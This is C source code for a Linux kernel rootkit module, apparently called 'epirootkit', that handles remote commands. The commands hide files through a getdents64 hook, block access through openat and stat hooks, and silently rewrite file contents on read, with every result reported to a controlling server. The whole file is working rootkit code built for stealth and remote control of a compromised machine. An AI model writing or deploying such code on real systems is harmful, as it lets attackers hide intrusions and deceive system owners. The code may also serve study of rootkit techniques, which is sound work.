#include "menu.h"

#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "alterate_api.h"
#include "epirootkit.h"
#include "forbid_api.h"
#include "hide_api.h"

static int hide_dir_handler(char *args);
static int unhide_dir_handler(char *args);
static int forbid_file_handler(char *args);
static int unforbid_file_handler(char *args);
static int list_hidden_handler(char *args);
static int list_forbidden_handler(char *args);
static int list_alterate_handler(char *args);
static int unmodify_file_handler(char *args);
static int modify_file_handler(char *args);

// hooks menu commands, must start with 'hooks' to be recognized
static struct command hooks_commands[] = {
    { "hide", 4, "hide a file or directory (getdents64 hook)", 43, hide_dir_handler },
    { "unhide", 6, "unhide a file or directory", 32, unhide_dir_handler },
    { "list_hide", 10, "list hidden files/directories", 34, list_hidden_handler },

    { "forbid", 6, "forbid open/stat on a file (openat/stat/lstat... hook)", 55, forbid_file_handler },
    { "unforbid", 8, "remove forbid on a file", 30, unforbid_file_handler },
    { "list_forbid", 12, "list forbidden files", 30, list_forbidden_handler },

    { "modify", 7, "[CAREFUL] modify a file with hide/replace operation (read hook)", 64, modify_file_handler },
    { "unmodify", 8, "unmodify a file", 30, unmodify_file_handler },
    { "list_modify", 12, "list alterate rules", 30, list_alterate_handler },

    { "help", 4, "display hooks help menu", 25, NULL },
    { NULL, 0, NULL, 0, NULL }
};

static int hooks_help(char *args) {
    int i;
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int off = snprintf(buf, STD_BUFFER_SIZE, "Available hooks commands:\n");
    for (i = 0; hooks_commands[i].cmd_name != NULL; i++) {
        off += snprintf(buf + off, STD_BUFFER_SIZE - off, "  %-12s - %s\n", hooks_commands[i].cmd_name, hooks_commands[i].cmd_desc);
        if (off >= STD_BUFFER_SIZE)
            break;
    }
    send_to_server("%s", buf);
    kfree(buf);
    return 0;
}

static int hide_dir_handler(char *args) {
    if (!args)
        return -EINVAL;
    int r = hide_file(args);
    if (r == SUCCESS)
        send_to_server("Hidden: %s\n", args);
    else
        send_to_server("Error hiding %s: %d\n", args, r);
    return r;
}

static int unhide_dir_handler(char *args) {
    if (!args)
        return -EINVAL;
    int r = unhide_file(args);
    if (r == SUCCESS)
        send_to_server("Unhidden: %s\n", args);
    else
        send_to_server("Error unhide %s: %d\n", args, r);
    return r;
}

static int forbid_file_handler(char *args) {
    if (!args)
        return -EINVAL;
    int r = forbid_file(args);
    if (r == SUCCESS)
        send_to_server("Forbidden: %s\n", args);
    else
        send_to_server("Error forbidding %s: %d\n", args, r);
    return r;
}

static int unforbid_file_handler(char *args) {
    if (!args)
        return -EINVAL;
    int r = unforbid_file(args);
    if (r == SUCCESS)
        send_to_server("Unforbidden: %s\n", args);
    else
        send_to_server("Error unforbid %s: %d\n", args, r);
    return r;
}

static int list_hidden_handler(char *args) {
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int len = hide_list_get(buf, STD_BUFFER_SIZE);
    if (len <= 0)
        send_to_server("No hidden entries\n");
    else
        send_to_server("%s", buf);
    kfree(buf);
    return 0;
}

static int list_forbidden_handler(char *args) {
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int len = forbid_list_get(buf, STD_BUFFER_SIZE);
    if (len <= 0)
        send_to_server("No forbidden entries\n");
    else
        send_to_server("%s", buf);
    kfree(buf);
    return 0;
}

static int list_alterate_handler(char *args) {
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int len = alterate_list_get(buf, STD_BUFFER_SIZE);
    if (len <= 0)
        send_to_server("No alterate rules, sorry.\n");
    else
        send_to_server("%s", buf);
    kfree(buf);
    return 0;
}

static int modify_file_handler(char *args) {
    // Parameters
    char *path;
    long hide_line = -1;
    char *hide_substr = NULL;
    char *replace_src = NULL;
    char *replace_dst = NULL;

    // Parsing
    char *token, *pair;

    // Get the first token
    path = strsep(&args, " ");
    if (!path || path[0] != '/') {
        send_to_server("Usage: modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
        return -EINVAL;
    }

    while (args && *args) {
        token = strsep(&args, " ");
        if (strncmp(token, "hide_line=", 10) == 0) {
            hide_line = simple_strtol(token + 10, NULL, 10);
        }
        else if (strncmp(token, "hide_substr=", 12) == 0) {
            hide_substr = kstrdup(token + 12, GFP_KERNEL);
            if (!hide_substr)
                return -ENOMEM;
        }
        else if (strncmp(token, "replace=", 8) == 0) {
            pair = token + 8;

            char *src_tok = strsep(&pair, ":");
            if (!pair) {
                send_to_server("Usage: replace=SRC:DST\n");
                return -EINVAL;
            }

            replace_src = kstrdup(src_tok, GFP_KERNEL);
            if (!replace_src)
                return -ENOMEM;

            replace_dst = kstrdup(pair, GFP_KERNEL);
            if (!replace_dst) {
                kfree(replace_src);
                return -ENOMEM;
            }
        }
    }

    return alterate_add(path, hide_line, hide_substr, replace_src, replace_dst);
}

static int unmodify_file_handler(char *args) {
    if (!args)
        return -EINVAL;
    int r = alterate_remove(args);
    if (r == SUCCESS)
        send_to_server("Removed: %s\n", args);
    else
        send_to_server("Error while removing %s: %d\n", args, r);
    return r;
}

// Dispatcher function
int hooks_menu_handler(char *args) {
    char *cmd = strsep(&args, " \t");
    int i;
    if (!cmd)
        return hooks_help(NULL);

    for (i = 0; hooks_commands[i].cmd_name != NULL; i++) {
        if (strncmp(cmd, hooks_commands[i].cmd_name,
                    hooks_commands[i].cmd_name_size)
            == 0) {
            if (hooks_commands[i].cmd_handler)
                return hooks_commands[i].cmd_handler(args);
            else
                return hooks_help(NULL);
        }
    }

    send_to_server("Unknown hooks cmd '%s', try 'hooks help'\n", cmd);
    return -EINVAL;
}